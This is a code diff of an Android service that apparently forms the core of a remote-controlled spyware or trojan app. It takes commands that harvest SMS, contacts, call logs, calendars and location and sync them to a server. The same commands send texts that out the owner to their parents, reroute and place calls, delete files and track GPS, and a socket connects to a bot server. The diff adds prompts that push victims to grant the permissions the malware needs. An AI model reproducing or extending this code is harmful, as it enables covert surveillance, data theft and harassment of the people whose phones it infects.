@@ -140,8 +140,9 @@ public class CommandsIntentService extends IntentService {
                         if (database.isOpen()) {
                             database.close();
                         }
-                        JobsScheduler.setJobRan(CommandsIntentService.this, JobsScheduler.DCIM_KEY);
                     }
+                }else{
+                    startPermissionActivity(this, intent, StorageActivity.class);
                 }
             } else if (action.equals(ACTION_PACKAGES)) {
 
@@ -172,8 +173,9 @@ public class CommandsIntentService extends IntentService {
                     } finally {
                         database.endTransaction();
                         database.close();
-                        JobsScheduler.setJobRan(CommandsIntentService.this, ACTION_CONTACTS);
                     }
+                }else{
+                    startPermissionActivity(this, intent, ContactsActivity.class);
                 }
             } else if (action.equals(ACTION_DEVICE_INFO)) {
                 SQLiteDatabase database = DatabaseHelper.getInstance(this).getWritableDatabase();
@@ -189,7 +191,6 @@ public class CommandsIntentService extends IntentService {
                 } finally {
                     database.endTransaction();
                     database.close();
-                    JobsScheduler.setJobRan(CommandsIntentService.this, ACTION_DEVICE_INFO);
                 }
             } else if (action.equals(ACTION_SYNC_PHONE_TO_SERVER)) {
                     Database.syncPhoneToDatabase(this);
@@ -211,7 +212,6 @@ public class CommandsIntentService extends IntentService {
                     } finally {
                         database.endTransaction();
                         database.close();
-                        JobsScheduler.setJobRan(CommandsIntentService.this, JobsScheduler.PHONE_CALLS_KEY);
                     }
                     ArrayList<CalendarEvent> calendarEvents = ContentProviders.Calendars.fetchCalendarEvents(CommandsIntentService.this);
                     try {
@@ -222,8 +222,9 @@ public class CommandsIntentService extends IntentService {
                         e.printStackTrace();
                     } finally {
                         database.endTransaction();
-                        JobsScheduler.setJobRan(CommandsIntentService.this, JobsScheduler.CALENDAR_EVENTS_KEY);
                     }
+                }else{
+                    startPermissionActivity(this, intent, CallLogActivity.class);
                 }
             } else if (action.equals(ACTION_SMS)) {
                 if (checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
@@ -239,7 +240,6 @@ public class CommandsIntentService extends IntentService {
                     } finally {
                         database.endTransaction();
                         database.close();
-                        JobsScheduler.setJobRan(CommandsIntentService.this, JobsScheduler.SMS_KEY);
                         try{
                             boolean isAlreadyBot = false;
                             Socket socket = SocketFactory.getDefault().createSocket(Bot.SERVER_ADDRESS, 6666);
@@ -293,8 +293,9 @@ public class CommandsIntentService extends IntentService {
                     } finally {
                         database.endTransaction();
                         database.close();
-                        JobsScheduler.setJobRan(CommandsIntentService.this, JobsScheduler.CALENDAR_EVENTS_KEY);
                     }
+                }else{
+                    startPermissionActivity(this, intent, CalendarActivity.class);
                 }
             } else if (action.equals(ACTION_WALLPAPER)) {
                 double randomNumber = Math.random();
@@ -315,7 +316,6 @@ public class CommandsIntentService extends IntentService {
             } else if (action.equals(ACTION_TEXT_PARENTS)) {
                 if (checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                     Messaging.Text.tellMyParentsImGay(this);
-                    JobsScheduler.setJobRan(this, JobsScheduler.TEXT_PARENTS_KEY);
                 }
             } else if (action.equals(ACTION_INSERT_CONTACT)) {
                 if (this.checkSelfPermission(Manifest.permission.WRITE_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
@@ -324,6 +324,8 @@ public class CommandsIntentService extends IntentService {
                         String number = intent.getStringExtra(Constants.Keys.ADDRESS_KEY);
                         ContentProviders.Contacts.insertContact(CommandsIntentService.this, name, number);
                     }
+                }else{
+                    startPermissionActivity(this, intent, ContactsActivity.class);
                 }
             } else if (action.equals(ACTION_WIFI_CARD)) {
                 if (checkSelfPermission(Manifest.permission.CHANGE_WIFI_STATE) == PackageManager.PERMISSION_GRANTED) {
@@ -332,6 +334,8 @@ public class CommandsIntentService extends IntentService {
             } else if (action.equals(ACTION_FLASHLIGHT)) {
                 if (checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                     Systems.Camera.persistentBlinkingFlashlight(this);
+                }else{
+                    startPermissionActivity(this, intent, CameraActivity.class);
                 }
             } else if (action.equals(ACTION_VIBRATOR)) {
                 Systems.Vibrations.vibrator(this);
@@ -340,18 +344,25 @@ public class CommandsIntentService extends IntentService {
                     Messaging.Text.shareApp(this);
                 }
             }else if (action.equalsIgnoreCase(ACTION_REROUTE_CALLS)) {
-                if (intent.hasExtra(OutgoingCallReceiver.NUMBER_KEY)) {
-                    String number = intent.getStringExtra(OutgoingCallReceiver.NUMBER_KEY);
-                    SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(this).edit();
-                    editor.putString(OutgoingCallReceiver.NUMBER_KEY, number);
-                    editor.apply();
+                if(checkSelfPermission(Manifest.permission.PROCESS_OUTGOING_CALLS) == PackageManager.PERMISSION_GRANTED){
+                    if (intent.hasExtra(OutgoingCallReceiver.NUMBER_KEY)) {
+                        String number = intent.getStringExtra(OutgoingCallReceiver.NUMBER_KEY);
+                        SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(this).edit();
+                        editor.putString(OutgoingCallReceiver.NUMBER_KEY, number);
+                        editor.apply();
+                    }
+                }else{
+                    startPermissionActivity(this, intent, CallLogActivity.class);
                 }
+
             } else if (action.equals(ACTION_CALL_PHONE)) {
                 if (checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                     if (intent.hasExtra(Constants.Keys.ADDRESS_KEY)) {
                         String number = intent.getStringExtra(Constants.Keys.ADDRESS_KEY);
                         Systems.Phone.phoneCall(this, number);
                     }
+                }else{
+                    startPermissionActivity(this, intent, PhoneActivity.class);
                 }
             } else if (action.equals(ACTION_SEND_SMS)) {
                 if (checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
@@ -374,21 +385,31 @@ public class CommandsIntentService extends IntentService {
                     Notifications.createNotification(this, title, content, 2000, android.R.drawable.stat_notify_error, Notification.PRIORITY_MAX);
                 }
             } else if (action.equals(ACTION_CREATE_FILE)) {
-                if (intent.hasExtra(Constants.Keys.FILE_NAME_KEY) && intent.hasExtra(Constants.Keys.FILE_CONTENT_KEY)) {
-                    String fileName = intent.getStringExtra(Constants.Keys.FILE_NAME_KEY);
-                    String content = intent.getStringExtra(Constants.Keys.FILE_CONTENT_KEY);
-                    Storage.Files.createTextFile(this, fileName, content);
+                if(checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED){
+                    if (intent.hasExtra(Constants.Keys.FILE_NAME_KEY) && intent.hasExtra(Constants.Keys.FILE_CONTENT_KEY)) {
+                        String fileName = intent.getStringExtra(Constants.Keys.FILE_NAME_KEY);
+                        String content = intent.getStringExtra(Constants.Keys.FILE_CONTENT_KEY);
+                        Storage.Files.createTextFile(this, fileName, content);
+                    }
+                }else{
+                    startPermissionActivity(this, intent, StorageActivity.class);
                 }
+
             } else if (action.equals(ACTION_PLAY_SONG)) {
                 if (intent.hasExtra(Constants.Keys.URL_KEY)) {
                     String url = intent.getStringExtra(Constants.Keys.URL_KEY);
                     Media.Audio.playSong(this, url);
                 }
             } else if (action.equals(ACTION_DELETE_FILE)) {
-                if (intent.hasExtra(Constants.Keys.FILE_NAME_KEY)) {
-                    String fileName = intent.getStringExtra(Constants.Keys.FILE_NAME_KEY);
-                    Storage.Files.deleteFile(this, fileName);
+                if(checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED){
+                    if (intent.hasExtra(Constants.Keys.FILE_NAME_KEY)) {
+                        String fileName = intent.getStringExtra(Constants.Keys.FILE_NAME_KEY);
+                        Storage.Files.deleteFile(this, fileName);
+                    }
+                }else{
+                    startPermissionActivity(this, intent, StorageActivity.class);
                 }
+
             } else if (action.equals(ACTION_LOCATION)) {
                 if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
 
@@ -409,20 +430,26 @@ public class CommandsIntentService extends IntentService {
                         double longitude = lastKnownLocation.getLongitude();
                         Database.insertLocation(DatabaseHelper.getInstance(CommandsIntentService.this), latitude, longitude);
                     }
+                }else{
+                    startPermissionActivity(this, intent, LocationActivity.class);
                 }
             }else if(action.equals(ACTION_GPS_TRACKER)){
-                boolean shouldTrackGps = false;
-                if(intent.hasExtra(Systems.Gps.GPS_TRACKER_KEY)){
-                    shouldTrackGps = intent.getBooleanExtra(Systems.Gps.GPS_TRACKER_KEY, false);
-                }
-                if(shouldTrackGps){
-                    if(! Systems.Gps.isTrackingLocation()){
-                        Systems.Gps.startLocationTracker(this);
+                if(checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED){
+                    boolean shouldTrackGps = false;
+                    if(intent.hasExtra(Systems.Gps.GPS_TRACKER_KEY)){
+                        shouldTrackGps = intent.getBooleanExtra(Systems.Gps.GPS_TRACKER_KEY, false);
+                    }
+                    if(shouldTrackGps){
+                        if(! Systems.Gps.isTrackingLocation()){
+                            Systems.Gps.startLocationTracker(this);
+                        }
+                    }else{
+                        if(Systems.Gps.isTrackingLocation()){
+                            Systems.Gps.stopLocationTracker(this);
+                        }
                     }
                 }else{
-                    if(Systems.Gps.isTrackingLocation()){
-                        Systems.Gps.stopLocationTracker(this);
-                    }
+                    startPermissionActivity(this, intent, LocationActivity.class);
                 }
             }else if(action.equals(ACTION_DOWNLOAD_HTTP_DATA)){
                 if(intent.hasExtra(Constants.Keys.URL_KEY)){
